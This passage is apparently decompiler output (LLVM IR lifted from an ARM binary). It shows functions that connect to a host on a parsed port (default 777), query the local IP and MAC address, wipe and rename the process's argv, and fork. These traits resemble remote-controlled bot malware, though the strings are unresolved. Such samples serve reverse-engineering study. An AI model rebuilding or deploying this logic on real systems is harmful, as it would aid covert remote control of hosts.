  %v7_efd8 = call i32 @function_d574(i32 %storemerge1019, i32 %v1_eea4, i32 %v1_eec0, i32 %v1_eedc, i32 %v2_eef0, i32 %storemerge2, i32 %storemerge3)
  %v2_efe0 = load i32, i32* @global_var_23700.47, align 4
  %v1_efe8 = call i32 @function_108d0(i32 %v2_efe0)
  %v1_eff0 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_eff4

dec_label_pc_eff4:                                ; preds = %dec_label_pc_efa0, %dec_label_pc_efb0
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_effc = call i32 @function_12410(i32 0, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_effc, i32* @r0, align 4
  %v2_f00c = icmp eq i32 %v2_effc, 0
  br i1 %v2_f00c, label %dec_label_pc_f06c, label %dec_label_pc_efa0

dec_label_pc_f018:                                ; preds = %dec_label_pc_ef60
  %v0_f018 = call i32 @function_a104()
  %v2_f020 = icmp eq i32 %v0_f018, 0
  br i1 %v2_f020, label %dec_label_pc_f028, label %dec_label_pc_f1ac

dec_label_pc_f028:                                ; preds = %dec_label_pc_f018
  %v7_f050 = call i32 @function_d574(i32 %v2_ee8c, i32 %v1_eea4, i32 %v1_eec0, i32 %v1_eedc, i32 %v2_eef0, i32 %storemerge2, i32 %storemerge3)
  %v2_f058 = load i32, i32* @global_var_23700.47, align 4
  %v1_f060 = call i32 @function_108d0(i32 %v2_f058)
  %v1_f068 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_eff4, %dec_label_pc_ef84, %dec_label_pc_ed7c, %dec_label_pc_f028
  %v2_f070 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19f0c.113 to i32), i32* @r1, align 4
  %v3_f07c = inttoptr i32 %v2_f070 to i8*
  %v4_f07c = call i32 @function_12030(i8* %v3_f07c, i32 ptrtoint ([9 x i8]* @global_var_19f0c.113 to i32))
  store i32 %v4_f07c, i32* @r0, align 4
  %v2_f084 = icmp eq i32 %v4_f07c, 0
  br i1 %v2_f084, label %dec_label_pc_f08c, label %dec_label_pc_f184

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f06c
  br label %dec_label_pc_f130

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_f130, %dec_label_pc_f164
  %v3_f0a4 = mul i32 %storemerge8, 4
  %v2_f0b0 = load i32, i32* @global_var_29778.54, align 4
  %v2_f0b4 = add i32 %v2_f0b0, %v3_f0a4
  %v1_f0b8 = inttoptr i32 %v2_f0b4 to i32*
  %v2_f0b8 = load i32, i32* %v1_f0b8, align 4
  %v2_f0bc = icmp eq i32 %v2_f0b8, 0
  br i1 %v2_f0bc, label %dec_label_pc_f124, label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0a0
  %v2_f0dc = load i32, i32* %v1_f0b8, align 4
  %v0_f0e0 = call i32 @function_10508()
  store i32 %v0_f0e0, i32* @r0, align 4
  %v9_f0e8 = icmp eq i32 %v2_f0dc, %v0_f0e0
  br i1 %v9_f0e8, label %dec_label_pc_f124, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0c4
  %v2_f100 = load i32, i32* @global_var_29778.54, align 4
  %v2_f104 = add i32 %v2_f100, %v3_f0a4
  %v1_f108 = inttoptr i32 %v2_f104 to i32*
  %v2_f108 = load i32, i32* %v1_f108, align 4
  %v2_f114 = call i32 @function_10670(i32 %v2_f108, i32 9)
  store i32 %v2_f114, i32* @r0, align 4
  %v1_f11c = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f0c4, %dec_label_pc_f0a0, %dec_label_pc_f0f0
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.1, %dec_label_pc_f0a0 ], [ %stack_var_-32.1, %dec_label_pc_f0c4 ], [ %v1_f11c, %dec_label_pc_f0f0 ]
  %v1_f128 = add i32 %storemerge8, 1
  br label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f08c, %dec_label_pc_f124
  %stack_var_-32.1 = phi i32 [ 0, %dec_label_pc_f08c ], [ %stack_var_-32.0, %dec_label_pc_f124 ]
  %storemerge8 = phi i32 [ 0, %dec_label_pc_f08c ], [ %v1_f128, %dec_label_pc_f124 ]
  %v5_f148 = load i32, i32* @global_var_2370c.52, align 4
  %v9_f15c = icmp eq i32 %v5_f148, 0
  br i1 %v9_f15c, label %dec_label_pc_f164, label %dec_label_pc_f0a0

dec_label_pc_f164:                                ; preds = %dec_label_pc_f130
  %v2_f148 = load i32, i32* @global_var_23708.51, align 4
  %tmp76 = icmp ugt i32 %v2_f148, %storemerge8
  br i1 %tmp76, label %dec_label_pc_f0a0, label %dec_label_pc_f184

dec_label_pc_f184:                                ; preds = %dec_label_pc_f164, %dec_label_pc_f06c
  %v2_f188 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19f18.117 to i32), i32* @r1, align 4
  %v3_f194 = inttoptr i32 %v2_f188 to i8*
  %v4_f194 = call i32 @function_12030(i8* %v3_f194, i32 ptrtoint ([10 x i8]* @global_var_19f18.117 to i32))
  %v2_f19c = icmp eq i32 %v4_f194, 0
  br i1 %v2_f19c, label %dec_label_pc_f1a4, label %dec_label_pc_f1ac

dec_label_pc_f1a4:                                ; preds = %dec_label_pc_f184
  %v1_f1a8 = call i32 @function_1422c(i32 0)
  br label %dec_label_pc_f1ac

dec_label_pc_f1ac:                                ; preds = %dec_label_pc_ee60, %dec_label_pc_ebac, %dec_label_pc_e974, %dec_label_pc_e7f0, %dec_label_pc_e8f0, %dec_label_pc_ea74, %dec_label_pc_ed30, %dec_label_pc_f018, %dec_label_pc_f184, %dec_label_pc_ee34, %dec_label_pc_ee08, %dec_label_pc_ede8, %dec_label_pc_edc8, %dec_label_pc_eda8, %dec_label_pc_ed9c, %dec_label_pc_eb80, %dec_label_pc_eb58, %dec_label_pc_eb38, %dec_label_pc_eb18, %dec_label_pc_eaf8, %dec_label_pc_ead8, %dec_label_pc_eacc, %dec_label_pc_e954, %dec_label_pc_e948, %dec_label_pc_e7d0, %dec_label_pc_e7c4, %dec_label_pc_e778, %dec_label_pc_e740, %dec_label_pc_f1a4
  %v1_f1b4 = phi i32 [ %v1_ee70, %dec_label_pc_ee60 ], [ %v1_ebbc, %dec_label_pc_ebac ], [ %v1_e984, %dec_label_pc_e974 ], [ %v1_e800, %dec_label_pc_e7f0 ], [ %v0_e8f0, %dec_label_pc_e8f0 ], [ %v0_ea74, %dec_label_pc_ea74 ], [ %v0_ed30, %dec_label_pc_ed30 ], [ %v0_f018, %dec_label_pc_f018 ], [ %v4_f194, %dec_label_pc_f184 ], [ %v1_ee44, %dec_label_pc_ee34 ], [ %v1_ee18, %dec_label_pc_ee08 ], [ %v1_edf8, %dec_label_pc_ede8 ], [ %v1_edd8, %dec_label_pc_edc8 ], [ %v1_edb8, %dec_label_pc_eda8 ], [ 0, %dec_label_pc_ed9c ], [ %v1_eb90, %dec_label_pc_eb80 ], [ %v1_eb68, %dec_label_pc_eb58 ], [ %v1_eb48, %dec_label_pc_eb38 ], [ %v1_eb28, %dec_label_pc_eb18 ], [ %v1_eb08, %dec_label_pc_eaf8 ], [ %v1_eae8, %dec_label_pc_ead8 ], [ 0, %dec_label_pc_eacc ], [ %v1_e964, %dec_label_pc_e954 ], [ 0, %dec_label_pc_e948 ], [ %v1_e7e0, %dec_label_pc_e7d0 ], [ 0, %dec_label_pc_e7c4 ], [ %v3_e79c, %dec_label_pc_e778 ], [ %v3_e750, %dec_label_pc_e740 ], [ %v1_f1a8, %dec_label_pc_f1a4 ]
  store i32 %v3_e70c, i32* @r4, align 4
  store i32 %v6_e70c, i32* @fp, align 4
  ret i32 %v1_f1b4

; uselistorder directives
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v3_f0a4, { 1, 0 }
  uselistorder i32 %v2_effc, { 2, 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_eedc, { 1, 0 }
  uselistorder i32 %v1_eec0, { 1, 0 }
  uselistorder i32 %v1_eea4, { 1, 0 }
  uselistorder i32 %v2_ee8c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_edf8, { 1, 0 }
  uselistorder i32 %v1_edd8, { 1, 0 }
  uselistorder i32 %v1_edb8, { 1, 0 }
  uselistorder i32 %v2_ed14, { 2, 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_ec28, { 1, 0 }
  uselistorder i32 %v1_ec0c, { 1, 0 }
  uselistorder i32 %v1_ebf0, { 1, 0 }
  uselistorder i32 %v2_ebd8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_eb48, { 1, 0 }
  uselistorder i32 %v1_eb28, { 1, 0 }
  uselistorder i32 %v1_eb08, { 1, 0 }
  uselistorder i32 %v1_eae8, { 1, 0 }
  uselistorder i32 %v2_ea58, { 2, 1, 0 }
  uselistorder i32 %v1_e9d4, { 1, 0 }
  uselistorder i32 %v1_e9b8, { 1, 0 }
  uselistorder i32 %v2_e9a0, { 1, 0, 3, 2 }
  uselistorder i32 %v2_e8d4, { 2, 1, 0 }
  uselistorder i32 %v1_e850, { 1, 0 }
  uselistorder i32 %v1_e834, { 1, 0 }
  uselistorder i32 %v2_e81c, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_d574, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_cfe0, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_dc58, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_e15c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19ea8.80 to i32), { 3, 10, 4, 11, 2, 12, 5, 13, 1, 14, 6, 15, 0, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19e64.49 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_f1ac, { 28, 8, 7, 0, 9, 10, 11, 12, 13, 14, 6, 1, 15, 16, 17, 18, 19, 20, 21, 5, 2, 22, 23, 4, 3, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_f130, { 1, 0 }
  uselistorder label %dec_label_pc_f124, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f0a0, { 1, 0 }
  uselistorder label %dec_label_pc_f06c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_eff4, { 1, 0 }
  uselistorder label %dec_label_pc_efa0, { 1, 0 }
  uselistorder label %dec_label_pc_ef60, { 1, 0 }
  uselistorder label %dec_label_pc_ef28, { 1, 0 }
  uselistorder label %dec_label_pc_ee84, { 1, 0 }
  uselistorder label %dec_label_pc_ed7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_ed0c, { 1, 0 }
  uselistorder label %dec_label_pc_ecc0, { 1, 0 }
  uselistorder label %dec_label_pc_ec80, { 1, 0 }
  uselistorder label %dec_label_pc_ebd0, { 1, 0 }
  uselistorder label %dec_label_pc_eaac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_ea50, { 1, 0 }
  uselistorder label %dec_label_pc_ea18, { 1, 0 }
  uselistorder label %dec_label_pc_e928, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e8cc, { 1, 0 }
  uselistorder label %dec_label_pc_e894, { 1, 0 }
}

define i32 @function_f1f4() local_unnamed_addr {
dec_label_pc_f1f4:
  %stack_var_-532 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_f1f8 = load i32, i32* @fp, align 4
  store i32 61952, i32* %stack_var_-4, align 4
  %v2_f1fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f1fc, i32* @fp, align 4
  %v2_f204 = ptrtoint i32* %stack_var_-532 to i32
  store i32 512, i32* @r2, align 4
  %v2_f214 = bitcast i32* %stack_var_-532 to i8*
  %v3_f214 = call i32 @function_11f30(i8* %v2_f214, i32 0)
  %v2_f21c = load i32, i32* @global_var_23700.47, align 4
  %v2_f220 = icmp eq i32 %v2_f21c, 0
  br i1 %v2_f220, label %dec_label_pc_f244, label %dec_label_pc_f228

dec_label_pc_f228:                                ; preds = %dec_label_pc_f1f4
  %v1_f234 = call i32 @function_108d0(i32 %v2_f21c)
  store i32 0, i32* @global_var_23700.47, align 4
  br label %dec_label_pc_f244

dec_label_pc_f244:                                ; preds = %dec_label_pc_f1f4, %dec_label_pc_f228
  %v2_f248 = load i32, i32* inttoptr (i32 144444 to i32*), align 4
  %v2_f24c = icmp eq i32 %v2_f248, 0
  br i1 %v2_f24c, label %dec_label_pc_f278, label %dec_label_pc_f264

dec_label_pc_f264:                                ; preds = %dec_label_pc_f244
  %v2_f268 = load i32, i32* inttoptr (i32 144444 to i32*), align 4
  %v1_f26c = add i32 %v2_f268, 1
  br label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f244, %dec_label_pc_f264
  %storemerge1 = phi i32 [ %v1_f26c, %dec_label_pc_f264 ], [ 0, %dec_label_pc_f244 ]
  store i32 %storemerge1, i32* inttoptr (i32 144444 to i32*), align 4
  %v4_f288 = mul i32 %storemerge1, 4
  %v5_f288 = add i32 %v4_f288, 144440
  %v6_f288 = inttoptr i32 %v5_f288 to i32*
  %v7_f288 = load i32, i32* %v6_f288, align 4
  store i32 %v7_f288, i32* @r1, align 4
  %v3_f294 = call i32 @function_12228(i8* %v2_f214, i32 %v7_f288)
  store i32 %v2_f204, i32* @r0, align 4
  %v2_f2b0 = call i32 @function_12308(i32 %v2_f204, i32 58)
  %v2_f2b8 = icmp eq i32 %v2_f2b0, 0
  br i1 %v2_f2b8, label %dec_label_pc_f308, label %dec_label_pc_f2c0

dec_label_pc_f2c0:                                ; preds = %dec_label_pc_f278
  store i32 %v2_f204, i32* @r0, align 4
  %v2_f2cc = call i32 @function_12308(i32 %v2_f204, i32 58)
  %v1_f2d4 = add i32 %v2_f2cc, 1
  store i32 %v1_f2d4, i32* @r0, align 4
  %v1_f2dc = call i32 @function_14030(i32 %v1_f2d4)
  store i32 %v2_f204, i32* @r0, align 4
  %v2_f2f4 = call i32 @function_12308(i32 %v2_f204, i32 58)
  %v3_f304 = inttoptr i32 %v2_f2f4 to i8*
  store i8 0, i8* %v3_f304, align 1
  br label %dec_label_pc_f308

dec_label_pc_f308:                                ; preds = %dec_label_pc_f278, %dec_label_pc_f2c0
  %stack_var_-20.0 = phi i32 [ 777, %dec_label_pc_f278 ], [ %v1_f2dc, %dec_label_pc_f2c0 ]
  %v3_f314 = call i32 @function_128b8(i32 2, i32 1, i32 0)
  store i32 %v3_f314, i32* @global_var_23700.47, align 4
  %v4_f340 = call i32 @function_9e90(i32 %v3_f314, i32 %v2_f204, i32 %stack_var_-20.0, i32 30)
  %v2_f348 = icmp eq i32 %v4_f340, 0
  %. = zext i1 %v2_f348 to i32
  store i32 %v3_f1f8, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_f204, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @function_14030, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f308, { 1, 0 }
  uselistorder label %dec_label_pc_f278, { 1, 0 }
  uselistorder label %dec_label_pc_f244, { 1, 0 }
}

define i32 @function_f37c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f37c:
  %v0_f37c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f37c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f37c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f37c, %bb
  %v10_f380 = load i32, i32* @r0, align 4
  ret i32 %v10_f380

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f384(i32 %arg1) local_unnamed_addr {
dec_label_pc_f384:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f388 = load i32, i32* @fp, align 4
  store i32 %v3_f388, i32* %stack_var_-16, align 4
  %v3_f3a4 = call i32 @function_128b8(i32 2, i32 2, i32 0)
  %v3_f3b4 = icmp eq i32 %v3_f3a4, -1
  br i1 %v3_f3b4, label %dec_label_pc_f3bc, label %dec_label_pc_f3cc

dec_label_pc_f3bc:                                ; preds = %dec_label_pc_f384
  br label %dec_label_pc_f608

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f384
  %v2_f3cc = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_f3dc = bitcast i32* %stack_var_-52 to i8*
  %v3_f3dc = call i32 @function_11f30(i8* %v2_f3dc, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19f24.122 to i32), i32* @r0, align 4
  %v2_f3ec = call i32 @function_126e8(i32 ptrtoint ([8 x i8]* @global_var_19f24.122 to i32))
  %v1_f3fc = call i32 @function_125e0(i32 53)
  %v3_f418 = call i32 @function_12710(i32 %v3_f3a4, i32 %v2_f3cc, i32 16)
  %v3_f428 = icmp eq i32 %v3_f418, -1
  br i1 %v3_f428, label %dec_label_pc_f430, label %dec_label_pc_f440

dec_label_pc_f430:                                ; preds = %dec_label_pc_f3cc
  br label %dec_label_pc_f608

dec_label_pc_f440:                                ; preds = %dec_label_pc_f3cc
  store i32 16, i32* %stack_var_-72, align 4
  %v2_f448 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f44c = ptrtoint i32* %stack_var_-72 to i32
  %v5_f458 = call i32 @function_12748(i32 %v3_f3a4, i32 %v2_f448, i32 %v2_f44c, i32 %v2_f448, i32 16)
  %v3_f468 = icmp eq i32 %v5_f458, -1
  br i1 %v3_f468, label %dec_label_pc_f470, label %dec_label_pc_f480

dec_label_pc_f470:                                ; preds = %dec_label_pc_f440
  br label %dec_label_pc_f608

dec_label_pc_f480:                                ; preds = %dec_label_pc_f440
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_29770.62 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_29770.62, align 4
  %v3_f494 = call i32 @function_10474(i32 ptrtoint ([16 x i8]* @global_var_19f2c.125 to i32), i32 0)
  %v2_f52c = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_f524

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_f524
  %v4_f4b8 = call i32 @function_12060(i32 %v2_f52c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19f3c.127, i32 0, i32 0))
  %v2_f4c0 = icmp eq i32 %v4_f4b8, 0
  br i1 %v2_f4c0, label %dec_label_pc_f508, label %dec_label_pc_f4e8.preheader

dec_label_pc_f4e8.preheader:                      ; preds = %dec_label_pc_f4a4
  %v2_f4ec9 = load i8, i8* %stack_var_-4168, align 1
  %v7_f4f013 = icmp eq i8 %v2_f4ec9, 9
  br i1 %v7_f4f013, label %dec_label_pc_f4f8, label %dec_label_pc_f4dc

dec_label_pc_f4dc:                                ; preds = %dec_label_pc_f4e8.preheader, %dec_label_pc_f4dc
  %v4_f4e814 = phi i32 [ %v1_f4e0, %dec_label_pc_f4dc ], [ %v2_f52c, %dec_label_pc_f4e8.preheader ]
  %v1_f4e0 = add i32 %v4_f4e814, 1
  %v5_f4e4 = inttoptr i32 %v1_f4e0 to i8*
  %v2_f4ec = load i8, i8* %v5_f4e4, align 1
  %v7_f4f0 = icmp eq i8 %v2_f4ec, 9
  br i1 %v7_f4f0, label %dec_label_pc_f4f8, label %dec_label_pc_f4dc

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4dc, %dec_label_pc_f4e8.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_f4e8.preheader ], [ %v5_f4e4, %dec_label_pc_f4dc ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_f54c

dec_label_pc_f508:                                ; preds = %dec_label_pc_f4a4
  store i32 4096, i32* @r2, align 4
  %v3_f520 = call i32 @function_11f30(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_f524

dec_label_pc_f524:                                ; preds = %dec_label_pc_f480, %dec_label_pc_f508
  %v4_f53c = call i32 @function_93f8(i32 %v2_f52c, i32 4096, i32 %v3_f494, i32 %v2_f52c)
  %v2_f544 = icmp eq i32 %v4_f53c, 0
  br i1 %v2_f544, label %dec_label_pc_f54c, label %dec_label_pc_f4a4

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f524, %dec_label_pc_f4f8
  %v1_f550 = call i32 @function_108d0(i32 %v3_f494)
  %v4_f560 = load i8, i8* %stack_var_-4168, align 1
  %v2_f564 = icmp eq i8 %v4_f560, 0
  br i1 %v2_f564, label %dec_label_pc_f5fc, label %dec_label_pc_f56c

dec_label_pc_f56c:                                ; preds = %dec_label_pc_f54c
  %v2_f574 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_f52c, i32* @r1, align 4
  %v2_f58c = bitcast i32* %stack_var_-4200 to i8*
  %v3_f58c = call i32 @function_12228(i8* %v2_f58c, i32 %v2_f52c)
  store i32 %v2_f574, i32* @r3, align 4
  %v3_f5ac = call i32 @function_10818(i32 %v3_f3a4, i32 35111, i32 %v2_f574)
  %v2_f5cc = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_f5bc

dec_label_pc_f5bc:                                ; preds = %dec_label_pc_f56c, %dec_label_pc_f5bc
  %storemerge47 = phi i32 [ 0, %dec_label_pc_f56c ], [ %v1_f5e8, %dec_label_pc_f5bc ]
  %v2_f5d4 = add i32 %storemerge47, %v2_f5cc
  %v1_f5d8 = inttoptr i32 %v2_f5d4 to i8*
  %v2_f5d8 = load i8, i8* %v1_f5d8, align 1
  %v4_f5e0 = add i32 %storemerge47, ptrtoint (i32* @global_var_23710.129 to i32)
  %v5_f5e0 = inttoptr i32 %v4_f5e0 to i8*
  store i8 %v2_f5d8, i8* %v5_f5e0, align 1
  %v1_f5e8 = add nuw nsw i32 %storemerge47, 1
  %v7_f5f8 = icmp slt i32 %v1_f5e8, 6
  br i1 %v7_f5f8, label %dec_label_pc_f5bc, label %dec_label_pc_f5fc

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5bc, %dec_label_pc_f54c
  %v1_f600 = call i32 @function_108d0(i32 %v3_f3a4)
  %v3_f61c.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_f618

dec_label_pc_f608:                                ; preds = %dec_label_pc_f470, %dec_label_pc_f430, %dec_label_pc_f3bc
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_f618

dec_label_pc_f618:                                ; preds = %dec_label_pc_f5fc, %dec_label_pc_f608
  %v3_f61c = phi i32 [ %v3_f61c.pre, %dec_label_pc_f5fc ], [ 0, %dec_label_pc_f608 ]
  %v2_f624 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f624, i32* @fp, align 4
  ret i32 %v3_f61c

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_f4e0, { 1, 0 }
  uselistorder i32 %v2_f52c, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_f3a4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32* @global_var_29770.62, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @function_12710, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_125e0, { 12, 11, 10, 9, 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @function_126e8, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_128b8, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f618, { 1, 0 }
  uselistorder label %dec_label_pc_f5bc, { 1, 0 }
  uselistorder label %dec_label_pc_f524, { 1, 0 }
  uselistorder label %dec_label_pc_f4dc, { 1, 0 }
}

define i32 @function_f640(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_f640:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-1164 = alloca i32, align 4
  %stack_var_-5260 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63052, i32* %stack_var_-4, align 4
  %v2_f648 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f648, i32* @fp, align 4
  %v2_f65c = ptrtoint i32* %stack_var_-32 to i32
  %v2_f678 = call i32 @function_1051c(i32* null)
  store i32 %v2_f678, i32* @r0, align 4
  store i32 %v2_f678, i32* @r4, align 4
  %v0_f680 = call i32 @function_10508()
  %v0_f688 = load i32, i32* @r4, align 4
  %v2_f688 = xor i32 %v0_f688, %v0_f680
  %v1_f690 = call i32 @function_13c5c(i32 %v2_f688)
  %v2_f698 = call i32 @function_1051c(i32* null)
  store i32 %v2_f698, i32* @r0, align 4
  store i32 %v2_f698, i32* @r4, align 4
  %v0_f6a0 = call i32 @function_10508()
  %v0_f6a8 = load i32, i32* @r4, align 4
  %v2_f6a8 = xor i32 %v0_f6a8, %v0_f6a0
  %v1_f6b0 = call i32 @function_8368(i32 %v2_f6a8)
  %v1_f6b4 = call i32 @function_f384(i32 %v1_f6b0)
  %v2_f6c8 = load i32, i32* %arg2, align 4
  store i32 %v2_f6c8, i32* @r0, align 4
  %v0_f6e8 = call i32 @function_11fd0()
  store i32 ptrtoint ([6 x i8]* @global_var_19f48.131 to i32), i32* @r1, align 4
  %v4_f6fc = call i32 @function_1224c(i32 %v2_f6c8, i32 ptrtoint ([6 x i8]* @global_var_19f48.131 to i32), i32 %v0_f6e8)
  br label %dec_label_pc_f77c

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f77c
  %v3_f710 = mul i32 %storemerge11, 4
  %v2_f728 = add i32 %v3_f710, %tmp
  %v1_f72c = inttoptr i32 %v2_f728 to i32*
  %v2_f72c = load i32, i32* %v1_f72c, align 4
  store i32 %v2_f72c, i32* @r0, align 4
  %v0_f758 = call i32 @function_11fd0()
  store i32 %v0_f758, i32* @r2, align 4
  %v2_f76c = inttoptr i32 %v2_f72c to i8*
  %v3_f76c = call i32 @function_11f30(i8* %v2_f76c, i32 0)
  %v1_f774 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_f77c

dec_label_pc_f77c:                                ; preds = %dec_label_pc_f640, %dec_label_pc_f70c
  %storemerge11 = phi i32 [ 1, %dec_label_pc_f640 ], [ %v1_f774, %dec_label_pc_f70c ]
  %v5_f794 = icmp slt i32 %storemerge11, %arg1
  br i1 %v5_f794, label %dec_label_pc_f70c, label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %dec_label_pc_f77c
  %v1_f798 = call i32 @function_8204(i32 %v2_f65c)
  store i32 %v1_f798, i32* @r4, align 4
  %v0_f7a0 = call i32 @function_8250()
  store i32 %v0_f7a0, i32* @r5, align 4
  %v0_f7a8 = call i32 @function_8228()
  %v0_f7c4 = load i32, i32* @r4, align 4
  %v0_f7c8 = load i32, i32* @r5, align 4
  %v7_f7cc = call i32 @function_10a58(i32 ptrtoint ([46 x i8]* @global_var_19f50.135 to i32), i32 ptrtoint (i32* @global_var_19f80.137 to i32), i32 %v0_f7c4, i32 %v0_f7c8, i32 %v0_f7a8, i32 ptrtoint (i32* @global_var_19f88.133 to i32))
  store i32 %v7_f7cc, i32* @r0, align 4
  %v0_f7d0 = call i32 @function_1054c()
  store i32 %v0_f7d0, i32* @r0, align 4
  %v2_f7e0 = icmp eq i32 %v0_f7d0, 0
  br i1 %v2_f7e0, label %dec_label_pc_f810, label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %dec_label_pc_f798
  %v2_f7e8 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v0_f7d0, i32* @r0, align 4
  %v3_f7f8 = call i32 @function_10580(i32 %v0_f7d0, i32 %v2_f7e8, i32 0)
  %v1_f800 = call i32 @function_1422c(i32 0)
  store i32 %v1_f800, i32* @r0, align 4
  br label %dec_label_pc_f830

dec_label_pc_f810:                                ; preds = %dec_label_pc_f798
  %v0_f810 = call i32 @function_1054c()
  store i32 %v0_f810, i32* @r0, align 4
  %v2_f820 = icmp eq i32 %v0_f810, 0
  br i1 %v2_f820, label %dec_label_pc_f830, label %dec_label_pc_f828

